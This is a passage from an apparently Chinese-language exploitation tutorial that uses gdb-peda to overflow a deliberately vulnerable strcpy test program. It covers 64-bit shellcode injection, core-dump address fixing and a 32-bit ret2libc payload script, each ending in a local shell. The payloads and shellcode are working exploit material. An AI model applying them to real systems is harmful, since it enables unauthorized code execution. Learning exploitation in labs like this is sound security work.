class="bash"> x/40xg <span class="hljs-variable">$rsp</span></span><br>0x7fffffffde20: 0x00007fffffffdf98      0x0000000200000000<br>0x7fffffffde30: 0xfffde98148c93148      0xffffef058d48ffff<br>0x7fffffffde40: 0x6227244955bb48ff      0x4827583148a6c747<br>0x7fffffffde50: 0x1df4e2fffffff82d      0x3dd5e8290b450bf1<br>0x7fffffffde60: 0x3ff895183677bd49      0x90a6c74767287c72<br>0x7fffffffde70: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde80: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde90: 0x9090909090909090      0x9090909090909090<br>0x7fffffffdea0: 0x9090909090909090      0x00007fffffffde30<br>0x7fffffffdeb0: 0x00007fffffffdf98      0x00000002f7fca000<br>0x7fffffffdec0: 0x0000000000401136      0x00007fffffffe2c9<br>0x7fffffffded0: 0x0000000000401180      0xc56a50d696c8e814<br>0x7fffffffdee0: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdef0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf00: 0x3a95af292ba8e814      0x3a95bf6959a4e814<br>0x7fffffffdf10: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf20: 0x0000000000000000      0x0000000000000002<br>0x7fffffffdf30: 0x00007fffffffdf98      0x00007fffffffdfb0<br>0x7fffffffdf40: 0x00007ffff7ffe220      0x0000000000000000<br>0x7fffffffdf50: 0x0000000000000000      0x0000000000401050<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br>process 3996 is executing new program: /usr/bin/dash<br>Error in re-setting breakpoint 1: No source file named /home/kali/StackOverflowtest/bol.c.<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br>[Inferior 1 (process 3996) exited normally]<br>Warning: not running<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> quit</span><br></code></pre></td></tr></table></figure>
<p>Êü•Áúã payload Âú®Ê†à‰∏≠ÁöÑÊÉÖÂÜµÔºåËøôÊ¨°Ê≤°ÈóÆÈ¢ò‰∫ÜÔºåÊàêÂäüÂæóÂà∞‰∏Ä‰∏™ shell„ÄÇ</p>
<p>Â∞ùËØïÂú® shell ‰∏≠ÊâßË°åÁ®ãÂ∫èÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">‚îÄ$ ./bol_64 $(python3 d.py)<br>Done!<br>zsh: segmentation fault  ./bol_64 $(python3 d.py)<br></code></pre></td></tr></table></figure>
<p>‰∏çÂá∫ÊâÄÊñôÔºåÂ§±Ë¥•‰∫ÜÔºåÁõ¥Êé•ÈÄöËøá core dump ÊñπÂºèÊü•ÊâæÁúüÊòØËøîÂõûÂú∞ÂùÄÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">ulimit</span> -c unlimited</span><br><span class="hljs-meta">$</span><span class="bash"> sudo sh -c <span class="hljs-string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./bol_64 $(python3 d.py)</span><br>Done!<br>zsh: segmentation fault (core dumped)  ./bol_64 $(python3 d.py)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls /tmp</span><br>core.1657191791   core.1657191862   core.1657191889   core.1657192242   core.1657192417<br>                                                                                                       <br><span class="hljs-meta">$</span><span class="bash"> gdb -q vuln /tmp/core.1657192417</span><br>vuln: No such file or directory.<br>[New LWP 1667]<br>Core was generated by `./bol_64 H1ÔøΩHÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩHÔøΩÔøΩÔøΩÔøΩÔøΩHÔøΩUI$&#x27;bG«¶H1X&#x27;H-ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ<br>                                                                      E<br>                                                                       )ÔøΩÔøΩ=IÔøΩw6‚ñíÔøΩÔøΩ?r|(gG«¶ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ&#x27;.<br>Program terminated with signal SIGSEGV, Segmentation fault.<br><span class="hljs-meta">#</span><span class="bash">0  0x00007fffffffde32 <span class="hljs-keyword">in</span> ?? ()</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xg 0x00007fffffffde30</span><br>0x7fffffffde30: 0x0000000000402004      0x00007ffff7e4cf8a<br>0x7fffffffde40: 0x0000000000401180      0x00007fffffffdef0<br>0x7fffffffde50: 0x0000000000401050      0x0000000000000000<br>0x7fffffffde60: 0x0000000000000000      0x000000000040116e<br>0x7fffffffde70: 0x00007fffffffdfe8      0x0000000200000000<br>0x7fffffffde80: 0xfffde98148c93148      0xffffef058d48ffff<br>0x7fffffffde90: 0x6227244955bb48ff      0x4827583148a6c747<br>0x7fffffffdea0: 0x1df4e2fffffff82d      0x3dd5e8290b450bf1<br>0x7fffffffdeb0: 0x3ff895183677bd49      0x90a6c74767287c72<br>0x7fffffffdec0: 0x9090909090909090      0x9090909090909090<br>0x7fffffffded0: 0x9090909090909090      0x9090909090909090<br>0x7fffffffdee0: 0x9090909090909090      0x9090909090909090<br>0x7fffffffdef0: 0x9090909090909090      0x00007fffffffde30<br>0x7fffffffdf00: 0x00007fffffffdfe8      0x00000002f7fca000<br>0x7fffffffdf10: 0x0000000000401136      0x00007fffffffe309<br>0x7fffffffdf20: 0x0000000000401180      0xc2c83e1e466f4ea0<br>0x7fffffffdf30: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdf40: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf50: 0x3d37c1e1f86f4ea0      0x3d37d1a189034ea0<br>0x7fffffffdf60: 0x0000000000000000      0x0000000000000000<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> quit</span><br></code></pre></td></tr></table></figure>
<p>ÂèëÁé∞ËøêË°åÊó∂ shellcode ÁöÑÂºÄÂßãÂú∞ÂùÄÂèòÊàê‰∫Ü 0x7fffffffde80Ôºå‰øÆÊîπ payloadÔºörip = b‚Äô\x80\xde\xff\xff\xff\x7f‚Äô</p>
<p>ÂÜçÊ¨°ËøêË°åÊàêÂäüÂæóÂà∞ shellÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol_64 $(python3 d.py)</span><br>Done!<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>kali<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br></code></pre></td></tr></table></figure>
<h2 id="ret-to-libcÔºö"><a href="#ret-to-libcÔºö" class="headerlink" title="ret to libcÔºö"></a>ret to libcÔºö</h2><blockquote>
<p>ËøôÈáå‰ΩøÁî®Ê≠£Â∏∏ÁöÑ32‰ΩçbolÁ®ãÂ∫è</p>
</blockquote>
<p>gdbË∞ÉËØïÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q bol_normal</span><br>Reading symbols from bol_normal...<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> list</span><br>1       #include &lt;string.h&gt;<br>2       #include &lt;stdio.h&gt;<br>3       void main(int argc, char *argv[]) &#123;<br>4           char buffer[100];<br>5           strcpy(buffer, argv[1]);<br>6           printf(&quot;Done!\n&quot;);<br>7       &#125;<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">break</span> 6</span><br>Breakpoint 1 at 0x804846e: file bol.c, line 6.<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass main</span><br>Dump of assembler code for function main:<br>   0x0804844d &lt;+0&gt;:     push   ebp<br>   0x0804844e &lt;+1&gt;:     mov    ebp,esp<br>   0x08048450 &lt;+3&gt;:     and    esp,0xfffffff0<br>   0x08048453 &lt;+6&gt;:     add    esp,0xffffff80<br>   0x08048456 &lt;+9&gt;:     mov    eax,DWORD PTR [ebp+0xc]<br>   0x08048459 &lt;+12&gt;:    add    eax,0x4<br>   0x0804845c &lt;+15&gt;:    mov    eax,DWORD PTR [eax]<br>   0x0804845e &lt;+17&gt;:    mov    DWORD PTR [esp+0x4],eax<br>   0x08048462 &lt;+21&gt;:    lea    eax,[esp+0x1c]<br>   0x08048466 &lt;+25&gt;:    mov    DWORD PTR [esp],eax<br>   0x08048469 &lt;+28&gt;:    call   0x8048310 &lt;strcpy@plt&gt;<br>   0x0804846e &lt;+33&gt;:    mov    DWORD PTR [esp],0x8048510<br>   0x08048475 &lt;+40&gt;:    call   0x8048320 &lt;puts@plt&gt;<br>   0x0804847a &lt;+45&gt;:    leave  <br>   0x0804847b &lt;+46&gt;:    ret    <br>End of assembler dump.<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> run AAAA</span><br>Starting program: /home/kali/StackOverflowtest/bol_normal AAAA<br>[----------------------------------registers-----------------------------------]<br>EBP: 0xffffd0d8 --&gt; 0x0 <br>ESP: 0xffffd050 --&gt; 0xffffd06c (&quot;AAAA&quot;)<br>EIP: 0x804846e (&lt;main+33&gt;:      mov    DWORD PTR [esp],0x8048510)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd050:     0xffffd06c      0xffffd377      0xf7ffd9d0      0x00000000<br>0xffffd060:     0x00000000      0x00000000      0x00000000      0x41414141<br>0xffffd070:     0x00000000      0x00000000      0xf7ffd000      0x00000000<br>0xffffd080:     0x08048350      0xf7fc9550      0x08048034      0xf7fa8a08<br>0xffffd090:     0x00000002      0xf7fdc480      0x00000000      0x080482dd<br>0xffffd0a0:     0xf7fa73fc      0xffffffff      0x0804a000      0x080484d2<br>0xffffd0b0:     0x00000002      0xffffd184      0xffffd190      0xf7df39d5<br>0xffffd0c0:     0xf7fdc480      0x00000000      0x0804848b      0x00000000<br>0xffffd0d0:     0x00000002      0x08048350      0x00000000      0xf7dda905<br>0xffffd0e0:     0x00000002      0xffffd184      0xffffd190      0xffffd114<br></code></pre></td></tr></table></figure>
<p>ÂèØ‰ª•ÁúãÂà∞ËæìÂÖ•ÁÇπÊòØ 0xffffd06cÔºåebp ÊòØ 0xffffd0d8ÔºåÂèØÂæóÂÅèÁßª‰∏∫Ôºö112</p>
<p>Êü•Êâæ system ÂáΩÊï∞ÂíåÂ≠óÁ¨¶‰∏≤ ‚Äú/bin/sh‚Äù ÁöÑÂú∞ÂùÄÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> p system</span><br><span class="hljs-meta">$</span><span class="bash">2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e00cc0 &lt;system&gt;</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> searchmem <span class="hljs-string">&quot;/bin/sh&quot;</span></span><br>Searching for &#x27;/bin/sh&#x27; in: None ranges<br>Found 1 results, display max 1 items:<br>libc : 0xf7f4bb62 (&quot;/bin/sh&quot;)<br></code></pre></td></tr></table></figure>
<p>ÊûÑÈÄ†payloadÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span><br>system = <span class="hljs-string">b&#x27;\xc0\x0c\xe0\xf7&#x27;</span><br>bin_sh = <span class="hljs-string">b&#x27;\x62\xbb\xf4\xf7&#x27;</span><br><br>payload = padding + system + <span class="hljs-string">b&quot;AAAA&quot;</span> + bin_sh<br><br>sys.stdout.buffer.write(payload)<br></code></pre></td></tr></table></figure>
<p>ÂÜçÊ¨°ËøêË°åÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 e.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol_normal $(python3 e.py)<br>[----------------------------------registers-----------------------------------]<br>EBP: 0xffffd068 (&quot;AAAA\300\f\340\367AAAAb\273\364&quot;, &lt;incomplete sequence \367&gt;)<br>ESP: 0xffffcfe0 --&gt; 0xffffcffc (&#x27;A&#x27; &lt;repeats 112 times&gt;, &quot;\300\f\340\367AAAAb\273\364&quot;, &lt;incomplete sequence \367&gt;)<br>EIP: 0x804846e (&lt;main+33&gt;:      mov    DWORD PTR [esp],0x8048510)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffcfe0:     0xffffcffc      0xffffd2ff      0xf7ffd9d0      0x00000000<br>0xffffcff0:     0x00000000      0x00000000      0x00000000      0x41414141<br>0xffffd000:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd010:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd020:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd030:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd040:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd050:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd060:     0x41414141      0x41414141      0x41414141      0xf7e00cc0<br>0xffffd070:     0x41414141      0xf7f4bb62      0xffffd100      0xffffd0a4<br></code></pre></td></tr></table></figure>
<p>Êü•Áúã payload ÂÜôÂÖ•ÊÉÖÂÜµÔºåÊ≤°‰ªÄ‰πàÈóÆÈ¢òÔºåÁªßÁª≠ËøêË°åÔºåÂæóÂà∞ shellÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br>[Attaching after process 2448 vfork to child process 2453]<br>[New inferior 2 (process 2453)]<br>[Detaching vfork parent process 2448 after child exec]<br>[Inferior 1 (process 2448) detached]<br>process 2453 is executing new program: /usr/bin/dash<br>Error in re-setting breakpoint 1: No source file named /home/kali/StackOverflowtest/bol.c.<br>[Attaching after process 2453 vfork to child process 2454]<br>[New inferior 3 (process 2454)]<br>[Detaching vfork parent process 2453 after child exec]<br>[Inferior 2 (process 2453) detached]<br>process 2454 is executing new program: /usr/bin/dash<br><span class="hljs-meta">$</span><span class="bash"> </span>   <br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>[Attaching after process 2454 vfork to child process 2455]<br>[New inferior 4 (process 2455)]<br>[Detaching vfork parent process 2454 after child exec]<br>[Inferior 3 (process 2454) detached]<br>process 2455 is executing new program: /usr/bin/whoami<br>kali<br>[Inferior 4 (process 2455) exited normally]<br><span class="hljs-meta">$</span><span class="bash"> Warning: not running</span><br>zsh: suspended (tty output)  gdb -q bol_normal<br></code></pre></td></tr></table></figure>
<p>shell ‰∏≠ËøêË°å‰πüÊàêÂäüÂæóÂà∞ shellÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol_normal $(python3 e.py)</span><br>Done!<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>kali<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)<br><span class="hljs-meta">$</span><span class="bash"> exiy</span><br>/bin/sh: 3: exiy: not found<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br>zsh: segmentation fault  ./bol_normal $(python3 e.py)<br></code></pre></td></tr></table></figure>
<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><h3 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h3><p><strong>1„ÄÅ‰øÆÊîπ gdb ÁéØÂ¢ÉÂèòÈáè</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Âà†Èô§ LINES Âíå COLUMNS ÂèòÈáè</span><br><span class="hljs-meta">$</span><span class="bash"> show environment</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">unset</span> environment LINES</span> <br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">unset</span> environment COLUMNS</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Áªü‰∏ÄÁéØÂ¢É</span><br><span class="hljs-meta">#</span><span class="bash"> Êó†ÁéØÂ¢ÉÂèòÈáèÂêØÂä®ÔºåÂè™Êúâ LINES Âíå COLUMNS ÂèòÈáèÔºåÂèØ‰ª•ËøõË°åÂà†Èô§</span><br><span class="hljs-meta">$</span><span class="bash"> env - gdb /home/kali/StackOverflowtest/bol</span><br><span class="hljs-meta">$</span><span class="bash"> env - /home/kali/StackOverflowtest/bol</span><br></code></pre></td></tr></table></figure>
<p><strong>2„ÄÅÈÄöËøá core dump ÁöÑÊñπÂºèËé∑ÂèñÁúüÂÆûÁöÑÂú∞ÂùÄÔºö</strong></p>
<blockquote>
<p>ÂéüÊñáÈìæÊé•Ôºö<a target="_blank" rel="noopener" href="https://blog.csdn.net/bitsec/article/details/81026447">https://blog.csdn.net/bitsec/article/details/81026447</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> ‰∫ßÁîü core Êñá‰ª∂ÔºåÂ∞±ÊòØÁ®ãÂ∫èËøêË°åÂèëÁîüÊÆµÈîôËØØÊó∂ÁöÑÊñá‰ª∂„ÄÇÂÜôÂÖ•ÈîôËØØÁöÑ ret_addrÔºåÂØºËá¥Á®ãÂ∫èÈîôËØØÔºå‰ºöÂæóÂà∞ core Êñá‰ª∂ÔºåÁÑ∂ÂêéÈÄöËøáË∞ÉËØï core Êñá‰ª∂ÊâæÂà∞Ê≠£Á°ÆÁöÑ buf ÁöÑÂÖ∂ÂÆûÂú∞ÂùÄ„ÄÇ</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">ulimit</span> -c unlimited</span><br><span class="hljs-meta">$</span><span class="bash"> sudo sh -c <span class="hljs-string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br></code></pre></td></tr></table></figure>
<p>ËøêË°åÔºåÂæóÂà∞ÈîôËØØËæìÂá∫Ôºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol $(python3 c.py )</span><br>Done!<br>zsh: segmentation fault (core dumped)  ./bol $(python3 c.py )<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls /tmp</span><br>core.1657100523<br></code></pre></td></tr></table></figure>
<p>gdb Ë∞ÉËØïÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q vuln /tmp/core.1657100523</span><br>vuln: No such file or directory.<br>[New LWP 9988]<br>Core was generated by `./bol ...&#x27;.<br>Program terminated with signal SIGSEGV, Segmentation fault.<br><span class="hljs-meta">#</span><span class="bash">0  0x90909090 <span class="hljs-keyword">in</span> ?? ()</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd0a0:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd0b0:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd0c0:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd0d0:     0xffffd0a0      0xffffd080      0xffffd080      0xffffd050<br>0xffffd0e0:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd0f0:     0x00000002      0xffffd194      0xffffd1a0      0xffffd124<br>0xffffd100:     0xffffd134      0xf7ffdb98      0xf7fc3420      0xf7fa7000<br>0xffffd110:     0x00000001      0x00000000      0xffffd178      0x00000000<br>0xffffd120:     0xf7ffd000      0x00000000      0x00000002      0x08049060<br>0xffffd130:     0x00000000      0x79122a66      0x3de2b676      0x00000000<br></code></pre></td></tr></table></figure>
<p>ÂèëÁé∞Ê†àÁöÑ‰ΩçÁΩÆÂèëÁîü‰∫ÜÂÅèÁßªÔºåebp ÂèòÊàê‰∫Ü 0xfffffd0d8 </p>
<p>‰øÆÊîπÊï∞ÊçÆÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">eip = b&#x27;\xe0\xd0\xff\xff\x80\xd0\xff\xff\x80\xd0\xff\xff\x90\xd0\xff\xff&#x27;<br></code></pre></td></tr></table></figure>
<p><strong>3„ÄÅÂà©Áî®ËÑöÊú¨Áªü‰∏ÄÁéØÂ¢ÉÂèòÈáè</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/hellman/fixenv">hellman/fixenv: Fix stack addresses (when no ASLR) with and without debugging (github.com)</a></p>
<h3 id="Offset"><a href="#Offset" class="headerlink" title="Offset"></a>Offset</h3><p>gdb ÂÜÖËÆ°ÁÆóÂÅèÁßªÈáèÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> pattern create 120</span> <br><span class="hljs-meta">gdb-peda$</span><span class="bash"> pattern search AA8A</span><br></code></pre></td></tr></table></figure>
<h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><p>ÂÖàÂÜô shellcode ÂÜçÂ°´ÂÖÖÊï∞ÊçÆÊàêÂäüÔºåÂÖàÂ°´ÂÖÖÊï∞ÊçÆÂÜçÂÜô shellcode ‰ºöÂ§±Ë¥• ÔºåÂèØËÉΩÂõ†‰∏∫ shellcode Ë¢´Ë¶ÜÁõñ „ÄÇ</p>
<h4 id="32-bit-program"><a href="#32-bit-program" class="headerlink" title="32 bit program"></a>32 bit program</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffcfe0:     0xffffcffc      0xffffd307      0xf7ffd9d0      0x00000000<br>0xffffcff0:     0x00000000      0x00000000      0x00000000      0x90909090<br>0xffffd000:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd010:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd020:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd050:     0x80cd17b0      0x6852d231      